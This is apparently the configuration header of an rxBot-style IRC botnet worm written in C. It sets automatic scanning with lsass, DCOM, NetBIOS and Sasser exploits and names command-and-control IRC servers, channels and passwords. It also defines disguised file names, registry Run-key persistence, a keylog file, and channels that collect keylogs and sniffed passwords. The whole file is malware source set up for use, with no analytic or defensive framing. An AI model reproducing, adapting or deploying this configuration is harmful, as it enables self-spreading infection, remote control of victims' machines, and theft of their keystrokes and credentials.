// bot configuration (generic) - doesn't need to be encrypted
// random autoscan on statup config
#define AUIP "222.x.x.x" //  example 218.220.x.x ip for autoscan on startup . leave it empty for default local scan .
#define sploit "lsass" // lsass,dcom135,dcom1025,netbios,Sasser5554,Sasser1023. all exploit working tested.
int athread = 1; // thread for autoscan
int delay = 6; //delay for autoscan
int minutes = 0; // 0 minutes = for ever
BOOL arandom = TRUE; //
////////
int port = 6667;				// server port
int port2 = 6667;				// backup server port
int socks4port = 6664;			// Port # for sock4 daemon to run on  - CHANGE THIS!!!
int tftpport = 71;				// Port # for tftp daemon to run on
int httpport = 81;			// Port # for http daemon to run on
int rloginport = 513;			// Port # for rlogin daemon to run on
BOOL topiccmd = TRUE;			// set to TRUE to enable topic commands
BOOL rndfilename = FALSE;		// use random file name
BOOL AutoStart = TRUE;			// enable autostart registry keys
char prefix = '.';				// command prefix (one character max.)
int maxrand = 7;				// how many random numbers in the nick
int nicktype = CONSTNICK;		// nick type (see rndnick.h)
BOOL nickprefix = TRUE;			// nick uptime & mirc prefix

#ifdef DEBUG_LOGGING
char logfile[]="c:\\system.dll";
#endif

#ifndef NO_CRYPT // Only use encrypted strings or your binary will not be secure!!
//rx_sky2k4

#else  // Recommended to use this only for Crypt() setup, this is unsecure.

char botid[] = "pwnanewb";						// bot id
char version[] = "x32 pwn";		// Bots !version reply
char password[] = "g0ty3rm0mst0ast";					// bot password
char server[] = "spl0it.ersidc.org"; // 
char serverpass[] = "";						// server password
char channel[] = "##spl0it";				// channel that the bot should join
char chanpass[] = "t0ast";						// channel password
char server2[] = "smack.rider.net";						// backup server (optional)
char channel2[] = "##spl0it";						// backup channel (optional)
char chanpass2[] = "t0ast";						// backup channel password (optional)
char filename[] = "mssetupconf.exe";			// destination file name
char keylogfile[] = "sc.dll";				// keylog filename
char valuename[] = "System Update";		// value name for autostart
char nickconst[] = "x32|";					// first part to the bot's nick
char szLocalPayloadFile[]="msconfig.dat";	// Payload filename
char modeonconn[] = "-x+i";					// Can be more than one mode and contain both + and -
char exploitchan[] = "#sploit";					// Channel where exploit messages get redirected
char keylogchan[] = "#sploit";						// Channel where keylog messages get redirected
char psniffchan[] = "#sploit";	

char *authost[] = {
	"critical@smackahoe.gov",
};

char *versionlist[] = {
	"mIRC v6.03 Khaled Mardam-Bey",
	"mIRC v6.10 Khaled Mardam-Bey",
	"mIRC v6.12 Khaled Mardam-Bey",
	"mIRC v6.14 Khaled Mardam-Bey"
};

char regkey1[]="Software\\Microsoft\\Windows\\CurrentVersion\\Run";
char regkey2[]="Software\\Microsoft\\Windows\\CurrentVersion\\RunServices";
char regkey3[]="Software\\Microsoft\\OLE";
char regkey4[]="SYSTEM\\CurrentControlSet\\Control\\Lsa";

#endif

#ifdef PLAIN_CRYPT
char key[16] = "di4blo87ow8y0u"; // CHANGE THIS!!! hmmm..Do I even need this now?
#endif

